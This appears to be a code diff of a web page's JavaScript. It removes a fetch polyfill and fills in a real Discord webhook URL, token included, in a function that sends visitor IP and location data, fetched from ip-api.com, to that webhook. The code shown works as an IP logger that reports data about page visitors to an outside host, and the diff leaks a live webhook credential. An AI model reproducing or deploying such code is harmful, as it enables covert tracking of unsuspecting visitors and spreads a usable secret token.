@@ -1,30 +1,3 @@
-  // Polyfill for fetch API
-        if (!window.fetch) {
-            window.fetch = function(url, options) {
-                return new Promise(function(resolve, reject) {
-                    var xhr = new XMLHttpRequest();
-                    xhr.onload = function() {
-                        if (xhr.status >= 200 && xhr.status < 300) {
-                            resolve(xhr.response);
-                        } else {
-                            reject(new Error(xhr.statusText));
-                        }
-                    };
-                    xhr.onerror = function() {
-                        reject(new Error("Network Error"));
-                    };
-                    xhr.open(options ? options.method || 'GET' : 'GET', url);
-                    if (options && options.headers) {
-                        for (var header in options.headers) {
-                            if (options.headers.hasOwnProperty(header)) {
-                                xhr.setRequestHeader(header, options.headers[header]);
-                            }
-                        }
-                    }
-                    xhr.send(options ? options.body : undefined);
-                });
-            }
-        }
 
         // Function to fetch IP data from ip-api.com
         async function fetchIPData() {
@@ -44,7 +17,7 @@
         // Function to send data to Discord webhook
         async function sendToDiscordWebhook(ipData) {
             try {
-                const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+                const webhookURL = 'https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-';
                 const payload = {
                     content: `IP Data:
 Country: ${ipData.country}
